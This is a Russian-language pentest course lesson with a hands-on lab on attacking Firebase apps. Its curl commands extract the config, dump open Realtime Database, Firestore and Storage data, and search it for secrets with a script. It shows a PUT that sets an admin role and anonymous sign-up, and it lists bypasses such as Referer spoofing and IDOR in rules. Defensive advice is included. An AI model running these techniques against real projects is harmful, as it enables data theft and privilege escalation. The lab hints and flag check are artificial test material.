---
id: cloud-gcp-firebase
title: "Firebase: security rules, открытые базы и кража данных"
category: cloud
parent: cloud-gcp-storage
difficulty: medium
order: 1
tags: [cloud, gcp, firebase, firestore, realtime-database, security-rules, storage]
prerequisites: [cloud-gcp-secrets-deep, cloud-gcp-storage]
useful_for:
  - "Пентест Firebase-приложений"
  - "Поиск открытых баз и Storage"
  - "Анализ security rules"
estimated_minutes: 45
summary: "Firebase: Realtime Database, Firestore, Storage и security rules. Как найти конфиг в клиенте, проверить rules и вытащить данные без аутентификации."
lab:
  kind: shell
  title: "Практика: открытая база Firebase"
  toolset: [core]
  workdir: /home/student/firebase
  files: [task.md, firebase-export.json, rules.json, notes.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Открой дамп базы: `cat firebase-export.json` (или `head -50`)."
    - "Правила в `rules.json` показывают, что база читается всеми (`\".read\": true`). Найди в дампе админский токен."
    - "Ищи значение с флагом: `grep nto firebase-export.json`."
    - "Выдели значение между кавычками: `grep nto firebase-export.json | cut -d'\"' -f4 > found.txt`."
---

## Задача

**Firebase** — это клиентская грань GCP: мобильные и веб-приложения обращаются к базе и хранилищу **напрямую**, без сервера-посредника. Значит, безопасность держится на **security rules** — правилах, что и кому разрешено. Ошибка вроде `allow read, write: if true` открывает все данные всему интернету.

Цель урока: из веб-приложения вытащить конфиг Firebase, проверить правила и прочитать базу без аутентификации.

## Данные, с которыми работаем

Разберём модель:
- **Realtime Database (RTDB)** — JSON-дерево, правила в узле `rules`;
- **Cloud Firestore** — документная БД, правила на языке `rules_version = '2'`;
- **Cloud Storage for Firebase** — файлы, правила в `storage.rules`;
- **apiKey** — идентифицирует проект; это **не секрет**, он вшит в клиент по дизайну.

Важно: конфиг публичен, «достать его» тривиально. Интересно, что разрешают правила. Ищем конфиг в JS-бандле:

```bash
$ curl -s https://app.example.com/main.js | grep -oE 'https://[a-z0-9-]+\.firebaseio\.com' | head -1
https://myapp-default-rtdb.firebaseio.com
$ curl -s https://app.example.com/main.js | grep -oE 'AIzaSy[A-Za-z0-9_-]{20,}' | head -1
AIzaSyDxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

У нас `databaseURL` и `apiKey`. Проверяем базу.

## Шаг 1: читаем RTDB без аутентификации

У Realtime Database есть REST-доступ: суффикс `/.json` возвращает всё дерево. Пробуем корень:

```bash
$ curl -s "https://myapp-default-rtdb.firebaseio.com/.json" -o db.json
$ head -c 120 db.json
{"users":{"1":{"email":"admin@example.com","role":"admin"}}, ...}
```

База отдала данные **анонимно** — правила разрешают чтение. Скачиваем всё и ищем секреты рекурсивно:

```bash
$ python3 - <<'PY'
import json
d = json.load(open('db.json'))
def walk(o, p=''):
    if isinstance(o, dict):
        for k,v in o.items(): walk(v, f'{p}/{k}')
    else:
        if any(s in p.lower() for s in ('password','token','key','secret','apikey')):
            print(p, '=', o)
walk(d)
PY
/users/1/apiKey = sk_live_51H...
/config/smtpPassword = ...
/private/adminToken = eyJhbGci...
```

За одну минуту — платёжный ключ, пароль SMTP и админский токен.

## Шаг 2: пробуем запись — эскалация

Правила могли разрешить и запись. Проверяем, записав себе роль `admin`:

```bash
$ curl -s -X PUT "https://myapp-default-rtdb.firebaseio.com/users/1/role.json" \
    -H 'Content-Type: application/json' -d '"admin"'
"admin"
$ curl -s "https://myapp-default-rtdb.firebaseio.com/users/1/role.json"
"admin"
```

Если приложение синхронизирует роль из базы, мы только что повысили себе права. Даже без этого запись позволяет подменить конфиг или данные.

## Полный прогон от начала до конца

1. Извлекли конфиг Firebase из JS.
2. `/.json` на RTDB → прочитали всю базу анонимно.
3. Рекурсивный поиск → нашли токены и ключи.
4. `PUT` в `users/1/role` → повысили роль (запись открыта).

## Если RTDB закрыт: Firestore, Storage и anonymous-вход

**Firestore** читается через REST по коллекциям:

```bash
$ curl -s "https://firestore.googleapis.com/v1/projects/myapp/databases/(default)/documents/orders" | \
    jq '.documents[].fields'
{"total":{"integerValue":"120"},"user":{"stringValue":"admin@example.com"}}
```

**Storage for Firebase** — файлы:

```bash
$ curl -s "https://firebasestorage.googleapis.com/v0/b/myapp.appspot.com/o?prefix=" | jq -r '.items[].name' | head
users/1/photo.jpg
exports/report.csv
$ curl -s "https://firebasestorage.googleapis.com/v0/b/myapp.appspot.com/o/exports%2Freport.csv?alt=media" -o report.csv
```

Если правила требуют аутентификации — пробуем **anonymous-вход** (он часто включён). Тогда мы становимся «анонимным пользователем» и правила могут дать больше:

```bash
$ curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyD..." \
    -H 'Content-Type: application/json' -d '{"returnSecureToken":true}' | jq -r '.idToken' | head -c 30
eyJhbGciOiJSUzI1NiIsImtpZCI6...
```

Полученный **ID-токен** — это JWT, подписанный Google. Подделать его без приватного ключа нельзя, но с ним мы проходим проверки `request.auth != null`. Смотрим claims токена:

```bash
$ echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
{"aud":"myapp","iss":"https://securetoken.google.com/myapp","sub":"...","provider_id":"anonymous"}
```

## Если не сработало: обходы и edge cases

- **IDOR в правилах.** Условие `request.auth.uid == resource.data.owner` обходится, если поле `owner` подконтрольно — просто укажи чужой uid.
- **API key restrictions.** Ограничение по referrer обходится подделкой заголовка `Referer`/`Origin`.
- **App Check.** Может блокировать запросы извне приложения — но иногда отключён.
- **Custom claims.** Роль может храниться в custom claims; подделка требует ключа подписи или ошибки проверки.
- **Debug/staging проекты.** Ищи проект с теми же данными, но более слабыми правилами.
- **Cloud Functions.** HTTP-триггеры Firebase Functions иногда открыты и обходят правила.

## Частые ошибки и подводные камни

- **Считать apiKey секретом.** Он публичен по дизайну; безопасность обеспечивают security rules, а не скрытие ключа.
- **Проверять только чтение.** Открытая запись позволяет эскалировать роль или подменить данные.
- **Забывать про Storage.** Данные часто лежат в файлах Firebase Storage, а не в базе.
- **Игнорировать anonymous auth.** Даже при `auth != null` анонимный вход даёт валидный токен.
- **Путать правила RTDB и Firestore.** У них разные форматы (`rules` JSON против `rules_version = '2'`), и ошибки в них выглядят по-разному.
- **Не проверять debug/staging.** Тот же проект в тестовом окружении часто имеет более слабые правила.

- **Считать ID-токен подделываемым.** Его подписывает Google; без ключа подписи подделать нельзя — ищите другие пути.
- **Не проверять App Check.** Иногда он отключён, и тогда запросы извне приложения проходят.
- **Забывать про IDOR в правилах.** Условие `request.auth.uid == resource.data.owner` обходится, если поле подконтрольно.

- **Не проверять Storage listing.** Открытый список файлов часто раскрывает выгрузки и бэкапы, которых нет в базе.
- **Игнорировать Cloud Functions.** HTTP-триггеры Firebase Functions иногда открыты и обходят security rules.

- **Не проверять несколько проектов.** Тот же продукт часто имеет dev/staging Firebase с более слабыми правилами.

## Что мы теперь знаем

- Firebase-конфиг (apiKey, databaseURL) публичен; безопасность дают **security rules**.
- RTDB читается через `/.json`; Firestore — через REST; Storage — через `firebasestorage.googleapis.com`.
- `allow read, write: if true` открывает данные и запись всем.
- Anonymous-вход даёт валидный ID-токен и проходит `auth != null`.
- Запись в базу позволяет эскалировать роль или подменить данные.
- Правила с `request.auth.uid == ...` уязвимы к IDOR, если поле подконтрольно.

## На что смотреть дальше

- **gcp-bigquery**: публичные датасеты и экспорт данных.
- **gcp-gke**: Workload Identity и захват метаданных пода.
- **gcp-cloudsql**: публичный доступ и IAM database auth.

## Глазами защитника

Firebase-проекты часто имеют публичный конфиг (apiKey, projectId), который не является секретом, но открывает доступ к сервисам. Реальная защита — security rules: RTDB и Firestore должны требовать аутентификацию и проверять владельца данных. Storage rules ограничивают загрузку. Anonymous auth включают осознанно. API-ключи ограничивают по HTTP-referrer и API. Аудит: правила хранят в репозитории, а не только в консоли.

## Частые вопросы

**Почему apiKey Firebase не секрет?**

Он идентифицирует проект, а не пользователя. Доступ определяется security rules и правилами аутентификации, а не ключом.

**Что такое security rules?**

Правила доступа к RTDB, Firestore и Storage. Ошибка вроде `read: true` открывает данные всем.

**Как читать RTDB без аутентификации?**

Запрос к `https://<project>.firebaseio.com/.json` возвращает всю базу, если правила разрешают чтение.

**Что даёт запись в базу?**

Эскалацию: подмену данных, инъекцию в приложение, иногда захват аккаунтов через изменение полей пользователей.

**Чем Firestore отличается от RTDB?**

Другой моделью данных и правилами. Firestore-правила тоже могут быть открыты (`allow read: if true`).

**Что такое anonymous auth?**

Вход без учётных данных. Если правила разрешают анонимам читать, этого достаточно для доступа.

**Как искать проекты Firebase?**

По конфигу в JS, по домену `firebaseio.com`, сканерами. Часто конфиг лежит в публичном репозитории.

**Как защититься?**

Строгие правила с проверкой `auth` и владельца, отключение публичного доступа, ограничение API-ключей, хранение правил в репозитории с ревью.

## Разбор: публичная RTDB

В JS-бандле приложения найден конфиг Firebase с `databaseURL`. Атакующий запрашивает `https://project.firebaseio.com/.json` и получает всю базу: пользователей, сообщения, токены. Правила разрешали `read: true` — частая ошибка в dev-проектах. Затем он пробует запись: `PUT /.json` с изменёнными данными — проходит. Теперь он может подменить контент и, если в базе есть поля ролей, повысить себе права. Защита — правила с проверкой `auth` и владельца, а не `true`.

## Что чаще всего упускают

То, что конфиг Firebase — не секрет, и его наличие в JS не ошибка. Ошибка — правила. Проверяй не ключ, а security rules: разрешено ли чтение и запись без аутентификации и проверяется ли владелец. Второе — Firestore и Storage: часто правила настроены для RTDB, а другие сервисы оставлены открытыми. Третье — anonymous auth: если он включён и правила доверяют анонимам, доступ есть у всех. Для атакующего порядок: найти конфиг, прочитать `/.json`, затем перейти к Firestore и Storage.

**Что если правила закрыты, но есть API-ключ?**

Ключ сам по себе не даёт доступ к данным. Но с ним можно вызывать разрешённые API (Auth, Identity Toolkit), поэтому проверь, какие API включены и не открыт ли anonymous auth.

**Опасен ли публичный Firebase Storage?**

Да: открытые правила Storage позволяют читать и загружать файлы, в том числе чужие, и это отдельная поверхность от базы.

## Квиз

Проверь себя.

```quiz
- question: "Является ли Firebase apiKey секретом?"
  options:
    - "Нет, он публичен; безопасность обеспечивают security rules"
    - "Да, это пароль администратора"
    - "Да, это приватный ключ подписи"
    - "Нет, он вообще не используется"
  answer: 0
  explanation: "apiKey идентифицирует проект, а не аутентифицирует пользователя."
- question: "Что означает правило 'allow read, write: if true'?"
  options:
    - "Любой может читать и писать без аутентификации"
    - "Только админ может писать"
    - "Только чтение разрешено"
    - "Только запись разрешена"
  answer: 0
  explanation: "Правило открывает и чтение, и запись всем."
- question: "Где хранятся правила Realtime Database?"
  options:
    - "В JSON-узле rules проекта"
    - "В CloudTrail"
    - "В IAM-политике"
    - "В KMS"
  answer: 0
  explanation: "Правила RTDB — это JSON, применяемый к дереву."
- question: "Как обойти ограничение apiKey по referrer?"
  options:
    - "Подделать заголовок Referer или Origin"
    - "Ввести пароль администратора"
    - "Запросить роль в GCP"
    - "Использовать SSH-туннель"
  answer: 0
  explanation: "Ограничение по referrer проверяет заголовок, который можно подменить."
- question: "Что даёт anonymous-вход в Firebase Auth?"
  options:
    - "Валидный ID-токен, проходящий проверку request.auth != null"
    - "Права администратора проекта"
    - "Доступ к KMS"
    - "Ничего"
  answer: 0
  explanation: "Анонимный пользователь получает настоящий токен, но с ограниченными правами."
```

## Куда дальше

В следующем уроке мы разберём **BigQuery** — публичные датасеты и экспорт данных, ещё один крупный источник утечек GCP. А пока главное запомни: **в Firebase apiKey не секрет — секрет это правила**; одно `if true` открывает всю базу, а `auth != null` обходится анонимным входом.

## Где пригодится

- **Пентест мобильных/веб:** Firebase-базы.
- **Bug bounty:** Firebase в scope.
- **Red team:** получение данных без аутентификации.
- **App security:** аудит security rules.
